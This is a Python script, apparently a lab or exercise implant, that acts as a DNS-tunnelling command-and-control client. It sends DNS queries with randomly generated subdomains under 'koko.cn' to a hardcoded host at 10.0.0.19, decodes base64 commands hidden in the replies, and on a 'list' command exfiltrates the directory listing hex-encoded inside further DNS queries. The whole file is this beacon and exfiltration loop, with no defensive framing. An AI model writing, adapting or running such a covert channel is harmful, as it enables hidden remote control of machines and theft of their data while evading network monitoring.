import socket
import struct
from base64 import *
from binascii import *
import string
import random
import os
import time

host, port = '10.0.0.19', 53

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
prefix = unhexlify('945801000001000000000000')
suffix = unhexlify('00100001')

def dga():
	letter = string.ascii_lowercase
	fake_domain = ''.join(random.choice(letter) for i in range(random.randrange(15,30)))
	fake_domain = fake_domain.encode()
	lenght = struct.pack('b',len(fake_domain))
	fake_domain = lenght + fake_domain +  b'\x04koko\x02cn\x00'
	return fake_domain

def build_data(data):
	assert (len(data) < 60)
	data = hexlify(data.encode()).encode()
	lenght = struct.pack('b',len(data))
	data = prefix + lenght + data + b'\x04koko\x02cn\x00' + suffix
	return data


while True:
	fake_domain = dga()
	hello = prefix + fake_domain + suffix
	s.sendto(hello,(host,port))
	data = s.recv(1024)
	print(data)
	cmd = ''
	for i in range(len(data)):
		if(data[12+i] == '\x00'):
			cmd = data[12+i+17:]
			break
	cmd = b64decode(cmd)
	if (cmd == 'list'):
		ls = str(os.listdir('.'))
		ls = build_data(ls)
		s.sendto(ls, (host,port))
		print(s.recv(1024))
	time.sleep(1)







